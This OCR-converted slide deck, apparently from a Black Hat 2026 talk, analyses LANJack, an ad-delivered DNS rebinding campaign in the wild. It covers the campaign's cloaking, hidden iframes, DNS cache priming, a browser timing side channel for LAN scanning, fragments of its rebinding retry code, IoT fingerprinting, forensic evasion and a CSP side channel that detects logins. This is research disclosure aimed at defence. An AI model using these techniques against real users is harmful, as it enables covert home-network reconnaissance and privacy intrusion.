---
title: "LANJack Turning Ads into IoT Recon Tools"
speakers: ["Moriya Pedael"]
conference: "Black Hat"
conference_full: "Black Hat USA 2026"
edition: "USA"
year: 2026
source_pdf: "BlackHat_USA_2026_Slides/Moriya Pedael_LANJack Turning Ads into IoT Recon Tools.pdf"
pages: 56
sha256: "dab9cd131880c61b7607d1355b4698ece7824f64627c63c0234d497c935321d0"
text_chars: 16226
ocr_pages: 26
has_ocr: true
redacted_secrets: 0
ocr_confidence: 86.5
ocr_unreliable_blocks: 3
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T05:39:53Z"
---
# LANJack Turning Ads into IoT Recon Tools

**Speakers:** Moriya Pedael  
**Conference:** Black Hat USA 2026  
**Source:** `BlackHat_USA_2026_Slides/Moriya Pedael_LANJack Turning Ads into IoT Recon Tools.pdf` (56 pages)


## Slide 1

# LANJack Turning Ads into IoT Recon Tools

MORIYA PEDAEL

1


> Recovered by OCR — confidence 87/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Turning Ads into loT Recon Tools ii
1
@® MORIYA PEDAEL
```

## Slide 2

About Me MORIYA PEDAEL

BEFORE

AFTER

2


> Recovered by OCR — confidence 94/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
About Me
@ MORIYA PEDAEL
BEFORE AFTER
2
```

## Slide 3

## About Me MORIYA PEDAEL

- **2016-2021** Graphic Designer

- **2020-2021** Web Developer

- **2022-Current** Security Researcher at

3


> Recovered by OCR — confidence 79/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
About Me
@ MORIYA PEDAEL
¢ 2016-2021 Graphic Designer
¢ 2020-2021 Web Developer :
¢ 2022-Current Security Researcher at Gg 7 Gg
Add Integrity
3
```

## Slide 4

## Agenda

### BACKGROUND

- Ad Ecosystem

- • Malvertising

- • DNS Rebinding

### LANJACK

- Discovery

- Attack Flow

- LANJack V3

TAKEAWAYS

4

## Slide 5

Ad Ecosystem PAST- DIRECT COMMUNICATION

**Advertiser**

**Publisher**

5


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Ad Ecosystem
@ PAST- DIRECT COMMUNICATION
Advertiser Publisher
@ys4
5
```

## Slide 6

Ad Ecosystem PRESENT- REAL TIME BIDDING

#### **Advertiser**

#### **Publisher**

7

## Slide 7

Ad Ecosystem PRESENT- REAL TIME BIDDING

- Executable Code

- Weak CSP & Sandbox Controls

   - Brand Impersonation & Social Engineering

   - Dynamic & Personalized Ads Resist Analysis

      - Complex Supply Chain

      - Third-Party Code Dependencies

**+ Billions of  Ad Every Day** Billions of Uncontrolled Script Executions in Trusted Environments

8

## Slide 8

Ad Ecosystem PRESENT- REAL TIME BIDDING

9


> Recovered by OCR — confidence 93/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Ad Ecosystem
Matrices ~ Tactics ~ Techniques ~ Defenses ~ CTl - Resources +
MITRE | ATT&CK’
ATT&CKcon 7.0 is coming October 27-28, 2026. Learn more about ATT&CKcon 7.0 and submi
TECHNIQUES Home > Techniques > Enterprise > Acquire Infrastructure > Malvertising
Acquire Acquire Infrastructure: Malvertising
Infrastructure
Domains Other sub-techniques of Acquire Infrastructure (8)
DNS Server
Adversaries may purchase online advertisements that can be abused to distribute
Virtual Private
Server
malware to victims. Ads can be purchased to plant as well as favorably position
artifacts in specific locations online, such as prominently placed within search
Server engine results. These ads may make it more difficult for users to distinguish
Botnet between actual search results and advertisements.'"! Purchased ads may also
. target specific audiences using the advertising network's capabilities, potentiall
further taking advantage of the trust inherently given to search engines and popular
```

## Slide 9

## Malvertising PRESENT

11


> Recovered by OCR — confidence 88/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
@ PRESENT —_—_——=s’[-
Scanned 255149 files.
Fast & Secure
Results Summary Enjoy apps on every device
[4 Total items scanned: 255149
+1 Total security risks detected:
[+] Total security risks resolved:
Total security risks requiring attention:
Threat Detected!
Trojan Fakealert 256
High Risk
FREE GIFT BOX
Available Now!
Have you received a Free Gift
Box before?
Yes
11
```

## Slide 10

## DNS Rebinding HOW IT WORKS

12


> Recovered by OCR — confidence 87/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DNS Rebinding _
http://malicious.com
Malicious
DNS
Attacker
Server
1.2.3.4
2) What IP of malicious.com ?
Real Public IP + Short Time to Live
Example: 1.2.3.4, TTL: 0
4) http://malicious.com
5] Malicious code
</> Get Resource 2026
from'./index.html' </>
TTL of malicious.com expired
```

## Slide 11

13


> Recovered by OCR — confidence 87/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Attacker Malicious
Server DNS
1.2.3.4
Real Public IP + Short Time to Live
Example: 1.2.3.4, TTL: 0
<
4) http://malicious.com
<
5) Malicious code
25 Origin: malicious.com IP: 1.2.3.4
</> Get Resource
from './index.html' </>
TTL of malicious.com expired
6) What IP of malicious.com ?
7) Private Local IP
Example: 192.168.1.50
<
20:
```

## Slide 12

## DNS Rebinding RELEVANT HISTORY

- **1996** DNS Rebinding via Java JVM

- **2007** Ad-Based DNS Rebinding Plugins PoC (Flash, Java)

- **2018** DNS Rebind Toolkit

- **2019** Singularity DNS Rebinding Framework

14

## Slide 13

LANJack SPECIALITY

- First known large-scale DNS Rebinding Campaign

- Delivered through ads

- Real browser-based attack

- No malware or user interaction

- Targeted internal services & IoT devices

15

## Slide 14

## LANJack DISCOVERY

**http** :// **performance-metrics** .net/ **ipScanner** 2.html?x=792928301778513561-702-1-121-1705-20-cEj9G-2962.5ynkt7iyzb8wh17munwfi10053-529475-52312853&ifa=805ff036-adbe-4fda-a9a1-0187b90591ed

16

## Slide 15

## LANJack DISCOVERY

**http** :// **performance-metrics** .net/ **ipScanner** 2.html?x=79292830......

17

## Slide 16

## LANJack DISCOVERY

##### **Cloaked Response: Ignored Users**

##### **Cloaked Response: Targeted Users**

18


> Recovered by OCR — confidence 85/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
@ DISCOVERY
Cloaked Response: Ignored Users
Name Domain
load.js?x=331857147-1772979237-501-1-1... 200 performance-metrics.net
= Coca-1536x439.jpg 200 burkina24.com
Cloaked Response: Targeted Users
Name Met... Status Domain
@ bla_iter3.jog GET (canceled) 10.0.0.1
@ bla_iter3.jog GET (failed) net::ERR... 192.168.1....
@ bla_iter3.jpg GET (canceled) 192.168.88.1
@ bla_iter3.jog GET (canceled 192.168.10...
@ bla_iter3.jpg GET (canceled 10.100.102.1
@ bla_iter3.jog GET (canceled 10.0.0.138
@ bla_iter3.jog GET (canceled
@ bla_iter3.jog GET (canceled
@ bla_iter3.jog GET (canceled
172.16.10.1
192.168.14.1
10.10.140.1 black hat
4417 requests | OBtransferred 0B resources 18
)
)
)
@ bla_iter3.jog GET (canceled) 10.219.3.1
)
)
)
```

## Slide 17

## LANJack DISCOVERY

##### **Cloaked Response: Ignored Users**

Cloaked Response: Targeted Users

19


> Recovered by OCR — confidence 86/100 on the text kept, 79/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
@ DISCOVERY
Cloaked Response: Ignored Users
Name Domain
load.js?x=331857147-1772979237-501-1-1... 200 performance-metrics.net
= Coca-1536x439.jpg 200 burkina24.com
Cloaked Response: Targeted Users
Url Method Status
@ http: /811dab5c-8c8e-49ab-bb1c-f50ca9e017ad vf-globallab.com:83/CamScanner2.html?x... GET 403
@ http://9e7df682-ede3-4451-a727-38bb26127ecd.vf-globallab.com:83/CamScanner2.html?x... GET 403
0 http://a41ac988-2305-4e11-8cb3-eb6f4eadcb0a.vf-globallab.com:8010/CamScanner2.html... GET UNKN.
Name Status v , Domain
(=) k33p?x=79292830-1778513... 200 54.209.207.15
[=] k33p?x=79292830-1778513... 200 54.209.207.15
(=) k33p?x=x=79292830-17785... 200 performance-metrics.net Rigck hat
19
```

## Slide 18

## LANJack DISCOVERY

**performance-metrics.net:**

**vf-globallab.com:**

20


> Recovered by OCR — confidence 88/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
@ DISCOVERY
performance-metrics.net: vf-globallab.com:
“vf-globallab.com"
3¢ Proximus
Vodafone Mobile Connect IT Administrator's Guide
@ys4
20
```

## Slide 19

## LANJack DISCOVERY

##### **burkina24.com:**

https://burkina24.com/wp-content/uploads/2025/06/coca-1536x439.jpg

**Target:**

21

## Slide 20

## LANJack CAMPAIGN EVOLUTION

22


> Recovered by OCR — confidence 96/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Jack
@ CAMPAIGN EVOLUTION
May
2025
November
2025
December May
2025 2026
LAN Recon
Main Version
RTSP Prob
Test Version
One Month
CSP Abuse Gesture Check
Test Version Test Version
One Week One Week
22
```

## Slide 21

## LANJack CAMPAIGN FLOW

Special:
DNS Cache Pollution &
Forensic Evasion

23


> Recovered by OCR — confidence 82/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
@ CAMPAIGN FLOW
Malicious
> f
a, Special:
. DNS Cache Pollution &
J Forensic Evasion
Attack Triggering
————— DNS Cache Priming
: credentials: ‘omit’ inaissance
AbortSignal: 1 sec
credentials: ‘omit’
mode: ‘no-cors’
cache: ‘no-store
AbortSignal: 3 sec
FETCH: http://10.0.0.253:80/favicon.ico
http://10.0.0.253:8888/favicon.ico
3) DNS Rebinding
IMG: http://${int32_IP}.${uuldv4()}.control.vf-aloballab.com/.
loT Fingerprinting &
FETCH: /ISAPI/Security/userCheck Exploitation preparation
Ieeninoineathen black hat
@ys4
23
```

## Slide 22

## LANJack ATTACK TRIGGERING

**Challenge :** Geographic Targeting Without Exposure **Solution :** Cloaking

- HTTP accessibility checks

- Log Results

- Loads ipScanner.html over HTTP

   - Hidden Iframe

   - Forced Redirect

24

## Slide 23

**Why Two Methods?**

## LANJack ATTACK TRIGGERING

25


> Recovered by OCR — confidence 88/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Why Two Methods? = (7
@ ATTACK TRIGGERING
25
```

## Slide 24

## LANJack ATTACK TRIGGERING

**Why Two Methods?**

**Challenge :** Execute Without User Awareness **Solution : Hidden Iframe Rendering**

26

## Slide 25

**Why Two Methods?**

LANJack ATTACK TRIGGERING

**Challenge :** Execute Within a Secure Context

**Solution :** Forced Navigation to Malicious Page

**Mixed Content:** a browser security mechanism that blocks insecure resources (HTTP) from being loaded inside secure pages (HTTPS).

27

## Slide 26

LANJack ATTACK TRIGGERING

**Why Two Methods?**

**Challenge :** Execute Within a Secure Context

**Solution :** Forced Navigation to Malicious Page

28

## Slide 27

LANJack ATTACK TRIGGERING

**Why Two Methods?**

**Challenge :** Execute Within a Secure Context

**Solution :** Forced Navigation to Malicious Page

29

## Slide 28

LANJack DNS CACHE PRIMING

**Challenge :** DNS Pinning **Solution :** Cache Priming

30


> Recovered by OCR — confidence 92/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LANJack on
DNS Pinning
Cache Priming
Malicious
Browser DNS
DNS Cache Priming
:{targeted_port}/CamScanner
Taken from the cache
Rebinding Code
Get root page
{uuidv4}.vf-globallab.com
TTL expired
3) What IP of {uuidv4}.vf-globallab.com ?
4) Private Local IP
30
```

## Slide 29

## LANJack DNS CACHE PRIMING

**Challenge :** DNS Pinning **Solution :** Cache Priming

- Unique UUID subdomains

- Common ports for IoT devices

- Loading under Hidden Iframes

- Round-robin approach

- Cleanup

32

## Slide 30

## LANJack LAN RECONNAISSANCE

**Challenge :** Identify Active Local Devices Despite Browser Restrictions

**Solution :** Exploit LNA Timing Exposure (Chrome v142+ & Firefox v151+)

**Local Network Access (LNA):** User permission required for local network access.

33

## Slide 31

## LANJack LAN RECONNAISSANCE

**Challenge :** Identify Active Local Devices Despite Browser Restrictions **Solution :** Exploit LNA Timing Exposure (Chrome v142+ & Firefox v151+)

**Chrome | Opened Issue**

**Firefox | Opened Issue**

34

## Slide 32

## LANJack LAN RECONNAISSANCE

**Challenge :** Identify Active Local Devices Despite Browser Restrictions **Solution :** Exploit LNA Timing Exposure (Chrome v142+ & Firefox v151+)

**Step 1: Identify the network gateway**

- Probe common local IP addresses defined in RFC 1918

- Requests for a non-existent resource

- Abort after 1 second

Fastest connection time → the Gateway

35

## Slide 33

## LANJack LAN RECONNAISSANCE

**Challenge :** Identify Active Local Devices Despite Browser Restrictions **Solution :** Exploit LNA Timing Exposure (Chrome v142+ & Firefox v151+)

**Step 2: Discover active internal devices**

- All Hosts in the /24 Subnet

- Priority Scan: x.x.x.[1–20] & x.x.x.[100–120]

- Reuse the Same 17 Target Ports

- Requests for favicon.ico

- Abort after 3 seconds

Any response → Host reachable Failure or timeout → Host unreachable

36

## Slide 34

## LANJack LAN RECONNAISSANCE

**Challenge :** Identify Active Local Devices Despite Browser Restrictions **Solution :** Exploit LNA Timing Exposure (Chrome v142+ & Firefox v151+)

##### **Step 2: Discover active internal devices**

�

37

## Slide 35

## LANJack DNS REBINDING

**Challenge :** Same-Origin Policy Blocks Cross-Origin Responses **Solution :** DNS Rebinding

Before
After

38


> Recovered by OCR — confidence 85/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LANJack on
Same-Origin Policy Blocks Cross-Origin Responses
DNS Rebinding
Malicious
Browser DNS
:{targeted_port}/CamScanner
Taken from the cache J
Rebinding Code
Get root page
{uuidv4}.vf-globallab.com
% DNS Rebinding TTL expired
cache: ‘no-store
: AbortSignal: 3 sec
http://10.0.0.253:8888/favicon.ico
CamScanner IFrame
3) What IP of {uuidv4}.vf-globallab.com ?
a4 loT Finaerorintina &
4) Private Local IP
IMG: http://${int32_IP}.${uuldv4()}.control.vf-aloballab.com/...
38
```

## Slide 36

## LANJack DNS REBINDING

##### **Challenge :** Same-Origin Policy Blocks Cross-Origin Responses

##### **Solution :** DNS Rebinding

Before
After

39

## Slide 37

## LANJack DNS REBINDING

**DNS Resolution swap to Internal IP:**

Before:

After:

40


> Recovered by OCR — confidence 78/100 on the text kept, 60/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
LANJack ion
@ DNS REBINDING
DNS Resolution swap to Internal IP:
Before:
Answers
65d67bd3-33ff-48c3-a665 0d92e1927e.vf-aloballab.com A z addr 54
Clas
cache: ‘no-store
AbortSignal: 3 sec Answers
2 DNS Rebinding Name: 85d67b« 48c3-a665 -8c0d92e1927e. vf
IMG: http://${int32_1P}.${uuldv4()}.control.vf-aloballab. con... Time to live 5 seconds)
a4 loT Finaerorintina & Addre:
40
```

## Slide 38

## LANJack DNS REBINDING

##### **Challenge :** DNS Pinning

**Solution :** Up to 100 Rebinding Attempts (1s Interval)

Before

After

41


> Recovered by OCR — confidence 86/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
cache: ‘no-store
: AbortSignal: 3 sec
http://10.0.0.253:8888/favicon.ico
CamScanner IFrame
IMG: http://${int32_IP}.${uuldv4()}.control.vf-aloballab.com/...
2 DNS Rebinding
a4 loT Finaerorintina &
DNS Pinning
Up to 100 Rebinding Attempts (‘s Interval)
Malicious
DNS
2] Rebinding Code
C3) Get root page
{uuidv4}.vf-globallab.com
TTL expired
What IP of {uuidv4}.vf-globallab.com ?
Up to 100 attempts
4) Private Victim Local IP
function fetchFrame() {
(retryFrameCounter 100) {
Homey("CamScan: Stop Trying After " retryFrameCounter + " Attempts - " location.host)
const json response. text().then((responseText) => {
(responseText. indexOf ( 'funads3212' ) 1) {
setTimeout(fetchFrame, 1 « 1000)
41
```

## Slide 39

LANJack IOT FINGERPRINTING & EXPLOITATION PREPARATION

**Challenge :** Identify Device-Specific Information

**Solution :** Hash-Based Identification & Targeted Reconnaissance

42

## Slide 40

LANJack IOT FINGERPRINTING & EXPLOITATION PREPARATION

**Challenge :** Identify Device-Specific Information

**Solution :** Hash-Based Identification & Targeted Reconnaissance

43

## Slide 41

LANJack IOT FINGERPRINTING & EXPLOITATION PREPARATION

**Challenge :** Identify Device-Specific Information

**Solution :** Hash-Based Identification & Targeted Reconnaissance

44

## Slide 42

## LANJack

IOT FINGERPRINTING & EXPLOITATION PREPARATION

**Challenge :** Identify Device-Specific Information

**Solution :** Hash-Based Identification & Targeted Reconnaissance

45

## Slide 43

## LANJack BONUS PHASE

##### **Challenge :** Forensic Evasion

DNS Cache Pollution & Forensic Evasion

**Solution :** Browser Noise Generation

- 5,000+ Random Subdomains

- Broken Image Flood

- DNS Cache Flooding

46

## Slide 44

## LANJack THIRD VARIANT

47


> Recovered by OCR — confidence 92/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Jack
@ THIRD VARIANT
May
2025
November
2025
December May
2025 2026
*
LAN Recon
Main Version
RTSP Prob
Test Version
One Month
CSP Abuse Gesture Check
Test Version Test Version
One Week One Week
47
```

## Slide 45

## LANJack THIRD VARIANT

48


> Recovered by OCR — confidence 77/100 on the text kept, 60/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
@ THIRD VARIANT
Attack Triggering
i lFrame
Controlled IFrame
Ey CSP Abused
>
< >< charset="utf-8">< >/i.html</
< >
carrier=izzix=" style="width: lpx;height: lpx;border:1px solid @eccc;" referrerpolicy="no-referrer"></ >
f2?
carriereizzix style="width: Ipx;height:1px;border:1px solid M#@ccc;" referrerpolicy="no-referrer"></ >
48
```

## Slide 46

## LANJack THIRD VARIANT

49


> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
@ THIRD VARIANT
Family Centre
ilFrame
@ys4
49
```

## Slide 47

## LANJack THIRD VARIANT

50


> Recovered by OCR — confidence 90/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
@ THIRD VARIANT
Attack Triggering
ilFrame
Controlled IFrame
50
```

## Slide 48

## LANJack THIRD VARIANT

51


> Recovered by OCR — confidence 79/100 on the text kept, 76/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
@® THIRD VARIANT
Name ¢ te Type nitiator
r1?x=285180446-1766546665-651-1-79-190 adsrevenuestream.duckdn 33.2 158:443 text/htmi httesJ/adsrevenuestre
=285180446-176 5 -6 Q 0 00 adsr nuestream.duckdn 158:443 text/html httos//adsre vestre
vy Request Payload View source
blocked-uri: "https://myactivity.google.com"
disposition: "enforce"
document-uri: "https://adsrevenuestream.duckdns.org/f1?x=285180446-1766546665-651-1-79-1909-15-qxdEq—9e61d95 f-5da4—3dde-—a67b-19047 fa22c
effective-directiv "frame-src"
line-number: 5
original-policy: “default-src ‘self //accounts.google.com htt //*.gstatic.com https://ogs.google.com htt /\h3.google.com ht
referrer: ""
source-file: "https://adsrevenuestream.duckdns.org
status—code: 200
violat directive: "“frame-src"
51
```

## Slide 49

## LANJack THIRD VARIANT

52


> Recovered by OCR — confidence 82/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LANJack a
@® THIRD VARIANT
report-uri /r1?x=285180446-1766546665-
52
```

## Slide 50

## LANJack THIRD VARIANT

53


> Recovered by OCR — confidence 82/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LANJack a
@® THIRD VARIANT
v Response headers
default-src ‘self’ https://accounts.google.com https://*.gstatic.com https://ogs.google.com htt
analytics.com https://play.google.com https://accounts.youtube.com https://www.google.com;
53
```

## Slide 51

## LANJack THIRD VARIANT

**CSP Allowed List CSP Violation Report accounts.** google.com *.gstatic.com ogs.google.com lh3.google.com **Google myactivity.** google.com www.google-analytics.com play.google.com accounts.youtube.com www.google.com **familycenter.** facebook.com **Facebook** www.facebook.com **/login** static.xx.fbcdn.net gateway.facebook.com

54

## Slide 52

## LANJack THIRD VARIANT

CSP Allowed List CSP Violation Report
( No Report ) (Report)
Google accounts.google.com myactivity.google.com
User Not Connected Connected

55

## Slide 53

## LANJack THIRD VARIANT

CSP Allowed List CSP Violation Report
( No Report ) (Report)
Facebook familycenter.facebook.com www.facebook.com/login
User Connected Not Connected

56

## Slide 54

## LANJack THIRD VARIANT

CONNECTED NOT CONNECTED
GOOGLE Report No Report
FACEBOOK No Report Report

57


> Recovered by OCR — confidence 85/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
@ THIRD VARIANT
CONNECTED |NOT CONNECTED
GOOGLE Report No Report
FACEBOOK | No Report Report
@ys4
57
```

## Slide 55

LANJack WHY IT WORKED

- Trust in Ads & Third-Party Code

- Inconsistent Security Controls

- Targeted Content Cloaking

- DNS Cache Priming

- LNA Timing Side Channel

- DNS Rebinding

- Weak IoT Interfaces

- CSP Side Channel

58

## Slide 56

LANJack TAKEAWAYS

Remember This:

- Ads can perform browser-based attacks

- • Browser access => attacker access

- • Secure your IoT devices

**Moriya Pedael**

59
